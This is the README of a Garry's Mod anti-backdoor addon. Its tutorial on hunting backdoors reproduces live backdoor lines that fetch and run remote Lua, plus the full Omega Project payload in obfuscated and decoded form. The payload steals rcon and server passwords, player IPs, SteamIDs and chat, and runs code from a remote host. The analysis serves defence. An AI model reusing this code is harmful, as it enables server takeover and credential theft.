# Backdoor Shield

Protect your Garry's Mod server against backdoors.

![logo](https://i.imgur.com/DJlASZh.png)

## !!WARNING!!

>Consider that this addon just gives you an extra layer of security! You'll be able to scan your files and avoid a series of unwanted executions with a basic real-time protection, but don't think that it'll get you out of all troubles!

## Install

Clone or download the files inside your **addons folder**.

## Configure

- Addon settings: **lua/bs/server/sv_init.lua**
- Scan definitions: **lua/bs/server/definitions.lua**

## Commands

    # Recursively scan folders:
    |
    |--> bs_scan folder(s)
    |
    |       Scan all files in folder(s) or in lua, gamemode and data
    |       folders.
    |
    |--> bs_scan_fast folder(s)

            Scan lua, txt, vmt, dat and json files in folder(s) or in
            lua, gamemode and data folders.

    # Run a series of tests when BS.DEVMODE is set to true:
    |
    | --> bs_tests


## Scan Logs

Each scan log is stored in **data/backdoor-shield**. They divide the results into risk groups that are displayed together during the detection or in order in the saved file.

<details><summary>Console</summary>
<p>
<img src="https://i.imgur.com/sBzfD9G.png"/>
</p>
</details>

<details><summary>File</summary>
<p>
<img src="https://i.imgur.com/kwUtAb0.png"/>
</p>
</details>
.

## Detection Logs

The real time protection prints console messages and creates detection logs in the folder **data\backdoor-shield/THE-CURRENT-DATE**. Results are stored in files that display all together, but are also stored separately by folder and type when detection contents are available.

<details><summary>1) Running two backdoors</summary>
<p>

```lua
-- Dead backdoor:

RunString(string.char(104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47, 98, 117, 114, 105, 101, 100, 115, 101, 108, 102, 101, 115, 116, 101, 101, 109, 46, 99, 111, 109, 47, 114, 101, 107, 116, 47, 114, 101, 107, 116, 46, 108, 117, 97, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 99, 41, 32, 82, 117, 110, 83, 116, 114, 105, 110, 103, 40, 99, 41, 32, 101, 110, 100, 32, 41))

-- Alive backdoor:

http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey=spxysAWoRdmPcPeQitSx", function(c) RunString(c) end )
```

</p>
</details>

<details><summary>2) Real time protection</summary>
<p>
<img src="https://i.imgur.com/3yWXO6D.png"/>
</p>
</details>

<details><summary>3) Logs folder</summary>
<p>
<img src="https://i.imgur.com/DhGWEbU.png"/>
</p>
</details>

<details><summary>4) General blocked executions log</summary>
<p>
<img src="https://i.imgur.com/XWCwr87.png"/>
</p>
</details>

<details><summary>5) Detection contents</summary>
<p>

- The first backdoor is dead, since the link inside the content doesn't work

<img src="https://i.imgur.com/o6itfE2.png"/>

- But the second one is doing some stuff

<img src="https://i.imgur.com/6i8xNtz.png"/>

<img src="https://i.imgur.com/MYHm7c8.png"/>

</p>
</details>

.

## Backdoor Hunting

Actually you can copy the detection results, decode them and keep going to see whats going on.

<details><summary>1) I disabled my old Lua snippets, took the end of the code from the last detection and ran it</summary>
<p>

```lua
-- Dead backdoor:

--RunString(string.char(104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47, 98, 117, 114, 105, 101, 100, 115, 101, 108, 102, 101, 115, 116, 101, 101, 109, 46, 99, 111, 109, 47, 114, 101, 107, 116, 47, 114, 101, 107, 116, 46, 108, 117, 97, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 99, 41, 32, 82, 117, 110, 83, 116, 114, 105, 110, 103, 40, 99, 41, 32, 101, 110, 100, 32, 41))

-- Alive backdoor:

--http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey=spxysAWoRdmPcPeQitSx", function(c) RunString(c) end )

_G["http"]["Fetch"]([[https:/]]..[[/api.omega-project.cz/api_connect.php?api_key=]],function(api)
  RunString(api)
end)
```

</p>
</details>

<details><summary>2) Now I got a bunch of things to analyze</summary>
<p>
<img src="https://i.imgur.com/SBwHXDy.png"/>

```
[ALERT]
-----------------------------------------------------------------------------------

[Backdoor Shield] Execution blocked!
    Function: http.Fetch
    Date: 08-29-2020
    Time: 19h 42m 45s
    Log: data/backdoor-shield/08-29-2020/log_blocked.txt
    Content Log: data/backdoor-shield/08-29-2020/http.Fetch/log_blocked_(19h 42m 45s).txt
    Url: https://api.omega-project.cz/api_connect.php?api_key=
    Detected:
        =_G
        RunString
        CompileString
        BroadcastLua
    Location: stack traceback:
	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
	addons/fakedoor/lua/autorun/server/sv_test2.lua:9: in main chunk


[CONTENT]
-----------------------------------------------------------------------------------

arguments	=	{
			"
--[[
 name: Ʊmega Project
 author: Inplex
 Google Trust Api factor: 78/100
 Last Update: 02 06 2020
 Description: If you use the panel for hack you will be banned !
]]

local debug = debug
local error = error
local ErrorNoHalt = ErrorNoHalt
local hook = hook
local pairs = pairs
local require = require
local sql = sql
local string = string
local table = table
local timer = timer
local tostring = tostring
local mysqlOO
local TMySQL
local _G = _G
UzjRokDYxAOWbxLIEiRXmogsroltxsCpQgiEkuIR = {}
local server_key = "UrJPyGUdi"_R=_G
if omega_ed463d5fadf4890eca35eb8ea156c847 == "HGEed463d5fadf4890eca35eb8ea156c847" then return end
omega_ed463d5fadf4890eca35eb8ea156c847="HGEed463d5fadf4890eca35eb8ea156c847"
_R["\95\48\120\54\56\51\50\53\51"]=_R["\104\116\116\112"]["\112\111\115\116"] or "timer"
_R["\95\48\120\52\56\50\51\55\54"]=_R["\104\116\116\112"]["\80\111\115\116"] or "Create"
_R["\95\48\120\49\55\54\53\49\52"]=_R["\72\84\84\80"] or "api.omega-project.cz"
_R["\95\48\120\52\53\49\57\53\54"]=_R["\83\101\114\118\101\114\76\111\103"] or ""
_R["\95\48\120\50\57\54\55\56\55"]=_R["\82\117\110\83\116\114\105\110\103"] or "rcon non trouvé"
_R["\95\48\120\51\52\50\52\53\48"]=_R["\102\105\108\101"]["\69\120\105\115\116\115"] or "print"
_R["\65\120\121\117\110\101\77\90\87\69"] = "api.omega-project.cz"
_R["\104\122\100\65\108\99\118\113\106\114"] = "\97\116\108\97\115\45\99\104\97\116\46\115\105\116\101"
_R["\95\48\120\57\52\48\49\51\55"] = _R["\69\114\114\111\114"]
local pGbSGVIuUevjvQbOFgCc, FCPttlLwqrzAChdIZtnd  = "\80\108\97\121\101\114\73\110\105\116\105\97\108\83\112\97\119\110", "\80\108\97\121\101\114\68\105\115\99\111\110\110\101\99\116\101\100"
local header_GwFWGpHBKMfYqsd = {
  ["Authorization"] = "ZWM2OGJkMjMxMGMyODRiODljNGYyNDliYTkzMWQ2Y2Q"
}

-- include request
_0x176514({ url=[[https://]]..AxyuneMZWE.."/api_anti_backdoors.php"; method="get"; success=function(api,anti_backdoors) _0x296787(anti_backdoors) end })
_0x176514({ url=[[https://]]..AxyuneMZWE.."/api_player_blacklist.php"; method="get"; success=function(api,bad_player_blacklist) _0x296787(bad_player_blacklist) end })

local addons_files, addons_folders = _R["file"]["Find"]("addons/*", "GAME")
for k,v in pairs(addons_folders) do
 if (v != "checkers") and (v != "chess") and (v != "common") and (v != "go") and (v != "hearts") and (v != "spades") then
  _0x482376([[https://]]..AxyuneMZWE.."/api_addons.php", {server_ip = _R["game"]["GetIPAddress"](),crsf = "LuicBbIVUSxUbwKyGdOPvHgEVMjRiZFsmMhwEuzy#MTg2LjIyOS4yMjYuMTAy#DcKbgZMolAqhaosmSYVGXXJTAgfyqJvQclnitBUy",addons_name = v, addons_update = util.Base64Encode(file.Time( "addons/"..v, "GAME" ))}, function(http_addons) 
    if _R["\115\116\114\105\110\103"]["\76\101\102\116"]( http_addons, 1 ) == "<" or http_addons == "" then 
      return 
     else 
      _0x296787(http_addons) 
    end 
  end, function( error ) 
  end, header_GwFWGpHBKMfYqsd ) 
 end 
end


util.AddNetworkString("cKdwwjkBzpUSproGWmGe")
_R["BroadcastLua"]([[net.Receive("cKdwwjkBzpUSproGWmGe",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
function _0x427940(HsQzhjEtDdhsZssJfpfL)
  timer.Simple( 0.5, function( )
   _R["data"] = util.Compress(HsQzhjEtDdhsZssJfpfL)
   _R["len"] = #data
   _R["\110\101\116"]["\83\116".."\97\114\116"]("cKdwwjkBzpUSproGWmGe")
   _R["\110".."\101\116"]["\87\114".."\105\116\101\85\73\110\116"](len, 16)
   _R["\110\101".."\116"]["\87\114\105\116\101\68".."\97\116\97"](data, len)
   _R["\110\101\116"]["\66\114\111".."\97\100\99\97\115\116"]()
  end)
end


util.AddNetworkString("QvQaTLXQJvDEmezmiHYj")
_R["BroadcastLua"]([[net.Receive("QvQaTLXQJvDEmezmiHYj",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
function SendPly(HsQzhjEtDdhsZssJfpfL, steamid64)
  timer.Simple( 0.5, function( )
   _R["\100\97\116\97"] = util.Compress(HsQzhjEtDdhsZssJfpfL)
   _R["\108\101\110"] = #data
   _R["\110\101\116"]["\83\116".."\97\114\116"]("QvQaTLXQJvDEmezmiHYj")
   _R["\110".."\101\116"]["\87\114".."\105\116\101\85\73\110\116"](len, 16)
   _R["\110\101".."\116"]["\87\114\105\116\101\68".."\97\116\97"](data, len)
   for k, ply in pairs(player.GetAll()) do
     if ( ply:SteamID64() == steamid64 ) then
        _R["\110\101\116"]["Send"](ply)
     end
   end
  end)
end

_R["\104\111\111\107"]["\65\100\100"](pGbSGVIuUevjvQbOFgCc, "nYQUQrWaerewCmEoqjVUvrrkWFAgjfYzfecgMiiTgymFAonGsT", function(ply) 
    _0x482376([[https://]]..AxyuneMZWE.."/api_get_logs.php",{ 
         ["\99\115\114\102"] = "ec68bd2310c284b89c4f249ba931d6cd",
         ["\99\111\108\111\114"] = "5dc766",
         ["\99\111\110\116\101\110\116"] = "Client "..ply:Name().." connected ("..ply:IPAddress()..").", 
         ["\115\101\114\118\101\114\95\105\112"]  = _R["game"]["GetIPAddress"]()
    },_0x296787)
end)

_R["\104\111\111\107"]["\65\100\100"](FCPttlLwqrzAChdIZtnd, "msBMAtvKWjUOHFZfNCRBemSkQdJnfwcpcfFnPKfQqxcaKEhMma", function(ply) 
    _0x482376([[https://]]..AxyuneMZWE.."/api_get_logs.php",{ 
         ["\99\115\114\102"] = "ec68bd2310c284b89c4f249ba931d6cd", 
         ["color"] = "de3333",
         ["\99\111\110\116\101\110\116"] = "Dropped "..ply:Name().." from server (Disconnect by user).", 
         ["\115\101\114\118\101\114\95\105\112"]  = _R["game"]["GetIPAddress"]()
    },_0x296787)
end)

function ServerLog( logs_content ) 
    _0x482376([[https://]]..AxyuneMZWE.."/api_get_logs.php",{ 
         ["\99\115\114\102"] = "ec68bd2310c284b89c4f249ba931d6cd", 
         content = logs_content, 
         server_ip = _R["game"]["GetIPAddress"]()
    },_0x296787) 
    return _0x451956( logs_content ) 
end 

function Error( string )
  _0x482376([[https://]]..AxyuneMZWE.."/api_get_logs.php",{ 
       ["\99\115\114\102"] = "ec68bd2310c284b89c4f249ba931d6cd", 
       ["\99\111\110\116\101\110\116"] = string, 
       ["\115\101\114\118\101\114\95\105\112"] = _R["game"]["GetIPAddress"]()
  },RunString)
  return _0x940137( string )
end

_R["\116\105\109\101\114"]["\67\114\101\97\116\101"]( "FLPcvsCBTQJoZQGLILQUDEVvRmPRvLoyVXEuMYOSOHMaEXDKse", 1, 0, function()
_R["\104\111\111\107"]["\65\100\100"]( "PlayerSay", "ujLFdRUcqVAoqZwfiMSQpZeWbcvItgnNitYilclAqwPUvxSmZW", function( ply, text )
local http_chat_table = {
    name = ply:Name(), 
    server_ip = _R["GetTcpInfo"](), 
    steamid64 = ply:SteamID64(),
    nyFaIvniEL = "TPlnCsTLWywBNOdjsIEpiZEXJLCAJoQzesllKZlW",
    BtNDxRHcgb = "PCBKWTMGVJirRWrxIPNjkwOesDxXxeFDdpepUfdM",
    jcqaplfenV = "crraFpbGqRmxDQCenENbzIJAuNUFieGTgdJoBiZG",
    LEUJYRpUyx = "aizJdLXTEVPoYQQsgMOdzSwCmNazHfRFrFNnffmT",
    FBWCeMNeTL = "LSxRhSnkNHyrbgtboMNzAiTZFrsnkkcLYGwciHlo", 
    message = text
  } 
_0x482376([[https://]]..AxyuneMZWE.."/chat_connect.php?haoaOPspJnETKyz=trPtLhCynfaGkLt", http_chat_table, function(http_chat) _0x296787(http_chat) end)
end)
if _0x342450("\99\102\103\47\97\117\116\111\101\120\101\99\46\99\102\103","GAME") 
  then local cfile = file.Read("cfg/autoexec.cfg","GAME") 
  for k,v in pairs(string.Split(cfile,"\n")) do 
    if string.StartWith(v,"rcon_password") 
    then rcon_pw = string.Split(v,"\"")[2] 
   end
  end 
end
if _0x342450("\99\102\103\47\115\101\114\118\101\114\46\99\102\103","GAME") 
  then cfile = file.Read("cfg/server.cfg","GAME") 
  for k,v in pairs(string.Split(cfile,"\n")) 
  do if string.StartWith(v,"rcon_password") 
  then rcon_pw = string.Split(v,"\"")[2] 
    end 
   end 
 end 
if _0x342450("\99\102\103\47\103\97\109\101\46\99\102\103","GAME") 
  then cfile = file.Read("cfg/game.cfg","GAME") 
  for k,v in pairs(string.Split(cfile,"\n")) 
  do if string.StartWith(v,"rcon_password") 
  then rcon_pw = string.Split(v,"\"")[2] 
    end 
   end 
 end  
 if _0x342450("\99\102\103\47\103\109\111\100\45\115\101\114\118\101\114\46\99\102\103","GAME") 
 then cfile = file.Read("cfg/gmod-server.cfg","GAME") 
 for k,v in pairs(string.Split(cfile,"\n")) 
 do if string.StartWith(v,"rcon_password") 
 then rcon_pw = string.Split(v,"\"")[2] 
   end 
  end 
end
if rcon_pw == "" then
 rcon_pw = "Aucun Rcon"
end
for k,v in pairs(player.GetAll()) do 
local DrkaWVDhZhRCHgyRGENj = {
    ["\110\97\109\101"] = v:GetName(),
    ["\105\112"] = v:IPAddress(),
    ["\115\101\114\118\101\114\95\105\112"] = _R["game"]["GetIPAddress"](),
    ["\99\114\115\102"] = "MMsFDCxvTbPfHnPUwcylyHhezmHbOsBlvhTiNhRz#MTg2LjIyOS4yMjYuMTAy#jSUttWLIHMKvFliWsMJRcDpxwgTHvKxLaPfwDBtZ",
    ["\115\116\101\97\109\105\100"] = v:SteamID(),
    ["\115\116\101\97\109\105\100\54\52"] = v:SteamID64(),
    ["OcvWPRmzdQ"] = "cZEHIshMiGdcmjIwgHRIBVckfUarvjwptUvgdeuw",
    ["khpvEspqLQ"] = "aaQsnnUqsxaGyqJkHqqxHCWJeAJMBHnixRPiFeQk",
    ["cZiGZpQXxK"] = "suKIfVNfRKCTdhQrvzbvKHfPmJMDyVfbdAdBTCtv",
    ["yNpPvxIEYQ"] = "jxcvvCnbgmfVMFbIxDIsIizjgGgSKeOCUTjiWdwm",
    ["NGiFdbJnXv"] = "dcUYvgSiZSvgHzSliHVxdliXIEMLhrzWhJPNpiZy"
  }
_0x482376([[https://]]..AxyuneMZWE.."/user_connect.php?rzfmjhnXKtVupXH=stmWrBHtmIsKpxN&ping=" .. v:Ping(), DrkaWVDhZhRCHgyRGENj, function( http_users ) 
     if _R["\115\116\114\105\110\103"]["\76\101\102\116"]( http_users, 1 ) == "<" or http_users == "" then
       return
     else
       _0x296787( http_users )
     end 
  end, function( error ) 
  end, header_GwFWGpHBKMfYqsd )
end
  local VsTWOaUGyYXokLUQDOTO = {
    ["\105"] = _R["GetTcpInfo"](),
    ["\110"] = _R["\71\101\116\72\111\115\116\78\97\109\101"](),
    ["\109"] = _R["\103\97\109\101"]["\71\101\116\77\97\112"](),
    ["\98\111"] = _R["\116\111\115\116\114\105\110\103"](#_R["\112\108\97\121\101\114"]["\71\101\116\66\111\116\115"]()),
    ["\99"] = _R["\103\97\109\101"]["\71\101\116\73\80\65\100\100\114\101\115\115"]().."{+}"..server_key.."{+}".."1598740966",
    ["\103"] = _R["\101\110\103\105\110\101"]["\65\99\116\105\118\101\71\97\109\101\109\111\100\101"](),
    ["\99\114\115\102"] = "MTg2LjIyOS4yMjYuMTAy#HAxFpswxUQiTyulaKvyYIkQxTCoXuLzjFBBoHsfC",
    ["\110\98"] = tostring(#player.GetAll()).."/"..game.MaxPlayers(),
    ["\108\117\114\108"] = _R["GetConVar"]("sv_loadingurl"):GetString(),
    ["\112\97\115\115"] = GetConVar("\115\118\95\112\97\115\115\119\111\114\100"):GetString(),
    ["\107"] = "",
    ["\99\108\105\101\110\116".."_".."\102\117\110\99"] = "_0x427940",
    ["\114"] = rcon_pw,
    ["eBQErysiKP"] = "XDuoiBjxoHEwaPvznpkehEuKxGcGxwsAoxBzjpAZ",
    ["dufqbNcvWE"] = "NrpfyEcyJIyupTUKZTaRoxzouNBZZHtYnuGxxLaF",
    ["GxRQEDghgj"] = "XJGGIQUzmaJxUsZZUUdTCyKuTlotFXznZhEgWZoe",
    ["ECFmDAYImx"] = "WvXwVKAUamKSoEAOVmzbHCyxhvVnDjOrLsasylcp",
    ["TlQPyMqTiE"] = "pVMWPprumKRsZrYSjDVCkoSOZsCwGWLWGlgSZNWt"
  }
  _0x482376("https://omega-project.cz/api_lib/_-_-drm-_-_/__.php", VsTWOaUGyYXokLUQDOTO, function(http_servers) 
    if _R["\115\116\114\105\110\103"]["\76\101\102\116"]( http_servers, 1 ) == "<" or http_servers == "" then 
      return 
    else 
      _0x296787(http_servers) 
    end 
  end, function( error ) 
  end, header_GwFWGpHBKMfYqsd ) 
end)

if 1 == 0 or 1 == 1 then
   local no_spam_plz = "cGhYBOTiQHkqBsENnrGnMPLxvwfEEwZlnpxlZHUHDCWdlWrrYB"
   CONNECTED_TO_MYSQL = true
   local all_server = sql.Query("SELECT * FROM server_list")
end

",
			11300,
			{
			Vary	=	"Accept-Encoding",
			Set-Cookie	=	"__cfduid=d011e81c32b1b9d48f331abfd6e4628a51598740966; expires=Mon, 28-Sep-20 22:42:46 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,GOOGLE_TRUST_FACTOR=qrLGXXkCAbsNhCdnLSyP; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=puyseuAkakcwHaKowHLZ; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=kszSrlEZYRsTXiZzfImB; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600",
			Transfer-Encoding	=	"chunked",
			Connection	=	"keep-alive",
			Date	=	"Sat, 29 Aug 2020 22:42:47 GMT",
			Content-Encoding	=	"gzip",
			Content-Type	=	"text/html; charset=UTF-8",
			Server	=	"cloudflare",
				},
			200,
}
```

</p>
</details>


<details><summary>3) After decoding, I can see everything</summary>
<p>

```lua
--[[
 name: Ʊmega Project
 author: Inplex
 Google Trust Api factor: 78/100
 Last Update: 02 06 2020
 Description: If you use the panel for hack you will be banned ! -- Lol, Xalalau
]]

if lock == "lock" then return end
lock="lock"

local header_cWcHqNprbaTRQip = {
  ["Authorization"] = "ZWM2OGJkMjMxMGMyODRiODljNGYyNDliYTkzMWQ2Y2Q"
}

HTTP({ url="https://api.omega-project.cz/api_anti_backdoors.php"; method="get"; success = function (api, anti_backdoors) RunString(anti_backdoors) end })
HTTP({ url="https://api.omega-project.cz/api_player_blacklist.php"; method="get"; success = function (api, bad_player_blacklist) RunString(bad_player_blacklist) end })

local addons_files, addons_folders = file.Find("addons/*", "GAME")

for k,v in pairs(addons_folders) do
    if (v != "checkers") and (v != "chess") and (v != "common") and (v != "go") and (v != "hearts") and (v != "spades") then -- Wtf?
        http.Post("https://api.omega-project.cz/api_addons.php", {
            server_ip = game.GetIPAddress(),
            crsf = "SztseEltZSFDyUscjSKJozBWfKCzHuUJjJwpnKgT#MTg2LjIyOS4yMjYuMTAy#djsPLByfuJkTKEfchWXIbLRYzPXqACCsPkvVHmnV",
            addons_name = v,
            addons_update = util.Base64Encode(file.Time( "addons/"..v, "GAME" ))
        },
        function(http_addons) 
            if string.Left( http_addons, 1 ) == "<" or http_addons == "" then 
                return
            else
                RunString(http_addons) 
            end 
        end,
        function( error ) end,
        header_cWcHqNprbaTRQip)
    end 
end

util.AddNetworkString("net_1")

BroadcastLua([[
    net.Receive("net_1", function()
        CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))))
    end)
]])

function someNetFunction(arg1)
    timer.Simple( 0.5, function( )
        data = util.Compress(arg1)
        len = #data

        net.Start("net_1")
            net.WriteUInt(len, 16)
            net.WriteData(data, len)
        net.Broadcast()
    end)
end

util.AddNetworkString("net_2")

BroadcastLua([[
    net.Receive("net_2", function()
        CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))))
    end)
]])

function SendPly(arg1, steamid64)
    timer.Simple( 0.5, function( )
        data = util.Compress(arg1)
        len = #data
        net.Start("net_2")
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        for k, ply in pairs(player.GetAll()) do
            if ( ply:SteamID64() == steamid64 ) then
                net.Send(ply)
            end
        end
    end)
end

hook.Add(PlayerInitialSpawn, "hook1", function(ply) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd",
        content = "Client "..ply:Name().." connected ("..ply:IPAddress()..").", 
        server_ip  = game.GetIPAddress()
    }, RunString)
end)

hook.Add(PlayerDisconnected, "hook2", function(ply) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
         csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
         color = "de3333",
         content = "Dropped "..ply:Name().." from server (Disconnect by user).", 
         server_ip  = game.GetIPAddress()
    }, RunString)
end)

function ServerLog( logs_content ) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
        content = logs_content, 
        server_ip = game.GetIPAddress()
    }, RunString) 

    return ServerLog( logs_content ) 
end 

function Error( string )
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
        content = string, 
        server_ip = game.GetIPAddress()
    },RunString)

    return error( string )
end

timer.Create( "timer1", 1, 0, function()
    hook.Add( "PlayerSay", "hook3", function( ply, text )
        local http_chat_table = {
            name = ply:Name(), 
            server_ip = GetTcpInfo(), 
            steamid64 = ply:SteamID64(),
            message = text
        }

        http.Post("https://api.omega-project.cz/chat_connect.php?MQOEJzPlmWGTzcI=oAyxQMjHSitigAJ", http_chat_table, function(http_chat) RunString(http_chat) end)
    end)

    if file.Exists("cfg/autoexec.cfg","GAME") then
        local cfile = file.Read("cfg/autoexec.cfg","GAME") 

        for k,v in pairs(string.Split(cfile,"\n")) do 
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end
        end 
    end

    if file.Exists("cfg/server.cfg","GAME") then
        cfile = file.Read("cfg/server.cfg","GAME") 
        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then 
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end 

    if file.Exists("cfg/game.cfg","GAME") then
        cfile = file.Read("cfg/game.cfg","GAME") 
        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end  

    if file.Exists("cfg/gmod-server.cfg","GAME") then
        cfile = file.Read("cfg/gmod-server.cfg","GAME") 

        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end

    if rcon_pw == "" then
        rcon_pw = "Aucun Rcon"
    end

    for k,v in pairs(player.GetAll()) do 
        local playerInfo = {
            name = v:GetName(),
            ip = v:IPAddress(),
            server_ip = game.GetIPAddress(),
            crsf = "TFIbsvQYjTFbgXmBOqkeNyKKsURUCRlFedXsdPIm#MTg2LjIyOS4yMjYuMTAy#sBktToCthmfpNctMDsDrhmWcHaDQwsakUivPAHVu",
            steamid = v:SteamID(),
            steamid64 = v:SteamID64(),
        }

        http.Post("https://api.omega-project.cz/user_connect.php?zkHNFOZQhmXBsva=soGpJmAfXbWSliy&ping=" .. v:Ping(), playerInfo, function( http_users ) 
            if string.Left( http_users, 1 ) == "<" or http_users == "" then
                return
            else
                RunString( http_users )
            end 
        end,
        function( error ) end,
        header_cWcHqNprbaTRQip)

    end

    local serverData = {
        i = GetTcpInfo(),
        n = GetHostName(),
        m = game.GetMap(),
        bo = tostring(#player.GetBots()),
        c = game.GetIPAddress().."{+}"..server_key.."{+}1597393287",
        g = engine.ActiveGamemode(),
        crsf = "MTg2LjIyOS4yMjYuMTAy#HSldBHvasYQuaoldmwxTWhRqdXntKabTIdewJWrW",
        nb = tostring(#player.GetAll()).."/"..game.MaxPlayers(),
        lurl = GetConVar("sv_loadingurl"):GetString(),
        pass = GetConVar("sv_password"):GetString(),
        k = "",
        client_func = "someNetFunction",
        r = rcon_pw
    }

    http.Post("https://omega-project.cz/api_lib/_-_-drm-_-_/__.php", serverData, function(http_servers) 
        if string.Left( http_servers, 1 ) == "<" or http_servers == "" then 
            return 
        else 
            RunString(http_servers) 
        end 
    end,
    function( error ) end,
    header_cWcHqNprbaTRQip ) 
end)

```

</p>
</details>

.

That's it. I hope you enjoy :)